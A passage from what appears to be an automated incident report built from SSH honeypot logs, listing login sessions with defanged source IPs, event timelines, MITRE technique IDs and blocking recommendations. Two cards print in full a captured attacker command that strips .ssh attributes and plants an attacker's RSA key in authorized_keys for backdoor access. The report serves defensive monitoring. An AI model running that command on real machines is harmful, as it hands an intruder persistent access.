| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:31:48` | `cowrie.session.connect` |
| `2026-06-30 17:31:48` | `cowrie.client.version` |
| `2026-06-30 17:31:48` | `cowrie.client.kex` |
| `2026-06-30 17:31:49` | `cowrie.login.success` |
| `2026-06-30 17:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cfd6d544135

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-06-30 17:31 |
| **Last Seen** | 2026-06-30 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:31:49` | `cowrie.session.connect` |
| `2026-06-30 17:31:49` | `cowrie.client.version` |
| `2026-06-30 17:31:49` | `cowrie.client.kex` |
| `2026-06-30 17:31:50` | `cowrie.login.success` |
| `2026-06-30 17:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d6eaf58d4a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 17:31 |
| **Last Seen** | 2026-06-30 17:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:31:56` | `cowrie.session.connect` |
| `2026-06-30 17:31:58` | `cowrie.client.version` |
| `2026-06-30 17:31:58` | `cowrie.client.kex` |
| `2026-06-30 17:32:03` | `cowrie.login.success` |
| `2026-06-30 17:32:07` | `cowrie.session.params` |
| `2026-06-30 17:32:07` | `cowrie.command.input` |
| `2026-06-30 17:32:09` | `cowrie.log.closed` |
| `2026-06-30 17:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d748bdcadd

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 17:32 |
| **Last Seen** | 2026-06-30 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:32:29` | `cowrie.session.connect` |
| `2026-06-30 17:32:29` | `cowrie.client.version` |
| `2026-06-30 17:32:29` | `cowrie.client.kex` |
| `2026-06-30 17:32:31` | `cowrie.login.success` |
| `2026-06-30 17:32:33` | `cowrie.session.params` |
| `2026-06-30 17:32:33` | `cowrie.command.input` |
| `2026-06-30 17:32:33` | `cowrie.log.closed` |
| `2026-06-30 17:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76109ef9f4d

| Field | Detail |
|---|---|
| **Source IP** | `117.89.249[.]222` |
| **First Seen** | 2026-06-30 17:36 |
| **Last Seen** | 2026-06-30 17:41 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:36:19` | `cowrie.session.connect` |
| `2026-06-30 17:36:19` | `cowrie.client.version` |
| `2026-06-30 17:36:20` | `cowrie.client.kex` |
| `2026-06-30 17:36:21` | `cowrie.login.success` |
| `2026-06-30 17:36:22` | `cowrie.session.params` |
| `2026-06-30 17:36:22` | `cowrie.command.input` |
| `2026-06-30 17:36:22` | `cowrie.command.failed` |
| `2026-06-30 17:36:22` | `cowrie.log.closed` |
| `2026-06-30 17:36:24` | `cowrie.session.params` |
| `2026-06-30 17:36:24` | `cowrie.command.input` |
| `2026-06-30 17:36:25` | `cowrie.session.file_download` |
| `2026-06-30 17:36:25` | `cowrie.log.closed` |
| `2026-06-30 17:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.89.249[.]222` to AbuseIPDB if not already reported
- [ ] Block `117.89.249[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb78bf55388

| Field | Detail |
|---|---|
| **Source IP** | `117.89.249[.]222` |
| **First Seen** | 2026-06-30 17:36 |
| **Last Seen** | 2026-06-30 17:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:36:25` | `cowrie.session.connect` |
| `2026-06-30 17:36:26` | `cowrie.client.version` |
| `2026-06-30 17:36:26` | `cowrie.client.kex` |
| `2026-06-30 17:36:28` | `cowrie.login.success` |
| `2026-06-30 17:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.89.249[.]222` to AbuseIPDB if not already reported
- [ ] Block `117.89.249[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-480b782ab219

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]149` |
| **First Seen** | 2026-06-30 17:39 |
| **Last Seen** | 2026-06-30 17:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:39:26` | `cowrie.session.connect` |
| `2026-06-30 17:39:26` | `cowrie.client.version` |
| `2026-06-30 17:39:27` | `cowrie.client.kex` |
| `2026-06-30 17:39:28` | `cowrie.login.success` |
| `2026-06-30 17:39:29` | `cowrie.session.params` |
| `2026-06-30 17:39:29` | `cowrie.command.input` |
| `2026-06-30 17:39:29` | `cowrie.command.failed` |
| `2026-06-30 17:39:30` | `cowrie.log.closed` |
| `2026-06-30 17:39:31` | `cowrie.session.params` |
| `2026-06-30 17:39:31` | `cowrie.command.input` |
| `2026-06-30 17:39:31` | `cowrie.session.file_download` |
| `2026-06-30 17:39:31` | `cowrie.log.closed` |
| `2026-06-30 17:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]149` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced855030545

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]149` |
| **First Seen** | 2026-06-30 17:39 |
| **Last Seen** | 2026-06-30 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:39:31` | `cowrie.session.connect` |
| `2026-06-30 17:39:31` | `cowrie.client.version` |
| `2026-06-30 17:39:32` | `cowrie.client.kex` |
| `2026-06-30 17:39:33` | `cowrie.login.success` |
| `2026-06-30 17:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]149` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c0d22abf9d

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]149` |
| **First Seen** | 2026-06-30 17:39 |
| **Last Seen** | 2026-06-30 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:39:34` | `cowrie.session.connect` |
| `2026-06-30 17:39:34` | `cowrie.client.version` |
| `2026-06-30 17:39:34` | `cowrie.client.kex` |
| `2026-06-30 17:39:35` | `cowrie.login.success` |
| `2026-06-30 17:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]149` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c54951bc3fa

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:43 |
| **Last Seen** | 2026-06-30 17:43 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:43:14` | `cowrie.session.connect` |
| `2026-06-30 17:43:15` | `cowrie.login.success` |
| `2026-06-30 17:43:15` | `cowrie.login.success` |
| `2026-06-30 17:43:16` | `cowrie.session.params` |
| `2026-06-30 17:43:16` | `cowrie.command.input` |
| `2026-06-30 17:43:16` | `cowrie.command.failed` |
| `2026-06-30 17:43:16` | `cowrie.command.input` |
| `2026-06-30 17:43:16` | `cowrie.command.failed` |
| `2026-06-30 17:43:16` | `cowrie.command.input` |
| `2026-06-30 17:43:16` | `cowrie.command.input` |
| `2026-06-30 17:43:16` | `cowrie.command.failed` |
| `2026-06-30 17:43:16` | `cowrie.command.failed` |
| `2026-06-30 17:43:48` | `cowrie.log.closed` |
| `2026-06-30 17:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3494ba6a80d8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 17:43 |
| **Last Seen** | 2026-06-30 17:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:43:50` | `cowrie.session.connect` |
| `2026-06-30 17:43:52` | `cowrie.client.version` |
| `2026-06-30 17:43:52` | `cowrie.client.kex` |
| `2026-06-30 17:43:57` | `cowrie.login.success` |
| `2026-06-30 17:44:01` | `cowrie.session.params` |
| `2026-06-30 17:44:01` | `cowrie.command.input` |
| `2026-06-30 17:44:02` | `cowrie.log.closed` |
| `2026-06-30 17:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-274a4ecb3d38

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:43 |
| **Last Seen** | 2026-06-30 17:44 |
| **Session Duration** | 38s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:43:52` | `cowrie.session.connect` |
| `2026-06-30 17:43:52` | `cowrie.login.success` |
| `2026-06-30 17:43:52` | `cowrie.login.success` |
| `2026-06-30 17:43:53` | `cowrie.session.params` |
| `2026-06-30 17:43:53` | `cowrie.command.input` |
| `2026-06-30 17:43:53` | `cowrie.command.failed` |
| `2026-06-30 17:43:57` | `cowrie.command.input` |
| `2026-06-30 17:43:57` | `cowrie.command.failed` |
| `2026-06-30 17:43:57` | `cowrie.command.input` |
| `2026-06-30 17:43:57` | `cowrie.command.input` |
| `2026-06-30 17:43:57` | `cowrie.command.failed` |
| `2026-06-30 17:43:57` | `cowrie.command.failed` |
| `2026-06-30 17:44:31` | `cowrie.log.closed` |
| `2026-06-30 17:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24d38e3120f

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:44 |
| **Last Seen** | 2026-06-30 17:45 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:44:32` | `cowrie.session.connect` |
| `2026-06-30 17:44:32` | `cowrie.login.success` |
| `2026-06-30 17:44:33` | `cowrie.session.params` |
| `2026-06-30 17:44:33` | `cowrie.command.input` |
| `2026-06-30 17:44:33` | `cowrie.command.failed` |
| `2026-06-30 17:44:35` | `cowrie.command.input` |
| `2026-06-30 17:44:35` | `cowrie.command.failed` |
| `2026-06-30 17:44:37` | `cowrie.command.input` |
| `2026-06-30 17:44:37` | `cowrie.command.failed` |
| `2026-06-30 17:44:39` | `cowrie.command.input` |
| `2026-06-30 17:44:39` | `cowrie.command.failed` |
| `2026-06-30 17:44:39` | `cowrie.command.input` |
| `2026-06-30 17:44:39` | `cowrie.command.input` |
| `2026-06-30 17:44:39` | `cowrie.command.failed` |
| `2026-06-30 17:44:39` | `cowrie.command.failed` |
| `2026-06-30 17:45:11` | `cowrie.log.closed` |
| `2026-06-30 17:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f78bfc640561

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:45 |
| **Last Seen** | 2026-06-30 17:45 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:45:14` | `cowrie.session.connect` |
| `2026-06-30 17:45:14` | `cowrie.login.success` |
| `2026-06-30 17:45:14` | `cowrie.session.params` |
| `2026-06-30 17:45:15` | `cowrie.command.input` |
| `2026-06-30 17:45:15` | `cowrie.command.failed` |
| `2026-06-30 17:45:15` | `cowrie.command.input` |
| `2026-06-30 17:45:15` | `cowrie.command.failed` |
| `2026-06-30 17:45:16` | `cowrie.command.input` |
| `2026-06-30 17:45:16` | `cowrie.command.failed` |
| `2026-06-30 17:45:17` | `cowrie.command.input` |
| `2026-06-30 17:45:17` | `cowrie.command.failed` |
| `2026-06-30 17:45:18` | `cowrie.command.input` |
| `2026-06-30 17:45:18` | `cowrie.command.input` |
| `2026-06-30 17:45:18` | `cowrie.command.failed` |
| `2026-06-30 17:45:18` | `cowrie.command.failed` |
| `2026-06-30 17:45:51` | `cowrie.log.closed` |
| `2026-06-30 17:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2f375fe50ea

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:45 |
| **Last Seen** | 2026-06-30 17:46 |
| **Session Duration** | 40s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:45:57` | `cowrie.session.connect` |
| `2026-06-30 17:45:57` | `cowrie.login.success` |
| `2026-06-30 17:45:57` | `cowrie.login.success` |
| `2026-06-30 17:45:58` | `cowrie.session.params` |
| `2026-06-30 17:45:58` | `cowrie.command.input` |
| `2026-06-30 17:45:58` | `cowrie.command.failed` |
| `2026-06-30 17:46:02` | `cowrie.command.input` |
| `2026-06-30 17:46:02` | `cowrie.command.failed` |
| `2026-06-30 17:46:06` | `cowrie.command.input` |
| `2026-06-30 17:46:06` | `cowrie.command.input` |
| `2026-06-30 17:46:06` | `cowrie.command.failed` |
| `2026-06-30 17:46:06` | `cowrie.command.failed` |
| `2026-06-30 17:46:37` | `cowrie.log.closed` |
| `2026-06-30 17:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0fea6627f55

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 17:46 |
| **Last Seen** | 2026-06-30 17:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:46:39` | `cowrie.session.connect` |
| `2026-06-30 17:46:39` | `cowrie.client.version` |
| `2026-06-30 17:46:39` | `cowrie.client.kex` |
| `2026-06-30 17:46:40` | `cowrie.login.success` |
| `2026-06-30 17:46:41` | `cowrie.session.params` |
| `2026-06-30 17:46:41` | `cowrie.command.input` |
| `2026-06-30 17:46:41` | `cowrie.log.closed` |
| `2026-06-30 17:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5288456cbef3

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:46 |
| **Last Seen** | 2026-06-30 17:47 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:46:39` | `cowrie.session.connect` |
| `2026-06-30 17:46:39` | `cowrie.login.success` |
| `2026-06-30 17:46:40` | `cowrie.session.params` |
| `2026-06-30 17:46:40` | `cowrie.command.input` |
| `2026-06-30 17:46:40` | `cowrie.command.failed` |
| `2026-06-30 17:46:40` | `cowrie.command.input` |
| `2026-06-30 17:46:40` | `cowrie.command.failed` |
| `2026-06-30 17:46:41` | `cowrie.command.input` |
| `2026-06-30 17:46:41` | `cowrie.command.failed` |
| `2026-06-30 17:46:42` | `cowrie.command.input` |
| `2026-06-30 17:46:42` | `cowrie.command.failed` |
| `2026-06-30 17:46:43` | `cowrie.command.input` |
| `2026-06-30 17:46:43` | `cowrie.command.input` |
| `2026-06-30 17:46:43` | `cowrie.command.failed` |
| `2026-06-30 17:46:43` | `cowrie.command.failed` |
| `2026-06-30 17:47:16` | `cowrie.log.closed` |
| `2026-06-30 17:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f5d7ebb8f8

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:47 |
| **Last Seen** | 2026-06-30 17:47 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:47:17` | `cowrie.session.connect` |
| `2026-06-30 17:47:17` | `cowrie.login.success` |
| `2026-06-30 17:47:18` | `cowrie.session.params` |
| `2026-06-30 17:47:18` | `cowrie.command.input` |
| `2026-06-30 17:47:18` | `cowrie.command.failed` |
| `2026-06-30 17:47:20` | `cowrie.command.input` |
| `2026-06-30 17:47:20` | `cowrie.command.failed` |
| `2026-06-30 17:47:22` | `cowrie.command.input` |
| `2026-06-30 17:47:22` | `cowrie.command.failed` |
| `2026-06-30 17:47:24` | `cowrie.command.input` |
| `2026-06-30 17:47:24` | `cowrie.command.failed` |
| `2026-06-30 17:47:27` | `cowrie.command.input` |
| `2026-06-30 17:47:27` | `cowrie.command.input` |
| `2026-06-30 17:47:27` | `cowrie.command.failed` |
| `2026-06-30 17:47:27` | `cowrie.command.failed` |
| `2026-06-30 17:47:58` | `cowrie.log.closed` |
| `2026-06-30 17:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19a9f8f73c2c

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:47 |
| **Last Seen** | 2026-06-30 17:48 |
| **Session Duration** | 32s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:47:58` | `cowrie.session.connect` |
| `2026-06-30 17:47:58` | `cowrie.login.success` |
| `2026-06-30 17:47:58` | `cowrie.login.success` |
| `2026-06-30 17:47:59` | `cowrie.session.params` |
| `2026-06-30 17:47:59` | `cowrie.command.input` |
| `2026-06-30 17:47:59` | `cowrie.command.failed` |
| `2026-06-30 17:47:59` | `cowrie.command.input` |
| `2026-06-30 17:47:59` | `cowrie.command.failed` |
| `2026-06-30 17:48:00` | `cowrie.command.input` |
| `2026-06-30 17:48:00` | `cowrie.command.input` |
| `2026-06-30 17:48:00` | `cowrie.command.failed` |
| `2026-06-30 17:48:00` | `cowrie.command.failed` |
| `2026-06-30 17:48:31` | `cowrie.log.closed` |
| `2026-06-30 17:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f88fcc6d9b

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:48 |
| **Last Seen** | 2026-06-30 17:49 |
| **Session Duration** | 37s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:48:32` | `cowrie.session.connect` |
| `2026-06-30 17:48:32` | `cowrie.login.success` |
| `2026-06-30 17:48:32` | `cowrie.login.success` |
| `2026-06-30 17:48:33` | `cowrie.session.params` |
| `2026-06-30 17:48:33` | `cowrie.command.input` |
| `2026-06-30 17:48:33` | `cowrie.command.failed` |
| `2026-06-30 17:48:35` | `cowrie.command.input` |
| `2026-06-30 17:48:35` | `cowrie.command.failed` |
| `2026-06-30 17:48:36` | `cowrie.command.input` |
| `2026-06-30 17:48:36` | `cowrie.command.input` |
| `2026-06-30 17:48:36` | `cowrie.command.failed` |
| `2026-06-30 17:48:36` | `cowrie.command.failed` |
| `2026-06-30 17:49:09` | `cowrie.log.closed` |
| `2026-06-30 17:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b30f6682ea6

| Field | Detail |
|---|---|
| **Source IP** | `73.222.233[.]25` |
| **First Seen** | 2026-06-30 17:49 |
| **Last Seen** | 2026-06-30 17:49 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:49:11` | `cowrie.session.connect` |
| `2026-06-30 17:49:11` | `cowrie.login.success` |
| `2026-06-30 17:49:12` | `cowrie.session.params` |
| `2026-06-30 17:49:12` | `cowrie.command.input` |
| `2026-06-30 17:49:12` | `cowrie.command.failed` |
| `2026-06-30 17:49:12` | `cowrie.command.input` |
| `2026-06-30 17:49:12` | `cowrie.command.failed` |
| `2026-06-30 17:49:12` | `cowrie.command.input` |
| `2026-06-30 17:49:12` | `cowrie.command.failed` |
| `2026-06-30 17:49:12` | `cowrie.command.input` |
| `2026-06-30 17:49:12` | `cowrie.command.failed` |
| `2026-06-30 17:49:12` | `cowrie.command.input` |
| `2026-06-30 17:49:12` | `cowrie.command.input` |
